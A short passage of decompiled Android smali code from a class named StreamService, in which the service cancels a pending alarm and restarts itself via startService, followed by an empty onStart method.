    iget-object v1, p0, Lcom/v1/StreamService;->l:Landroid/app/PendingIntent;

    invoke-virtual {v0, v1}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-class v1, Lcom/v1/StreamService;

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcom/v1/StreamService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 0

    return-void
.end method
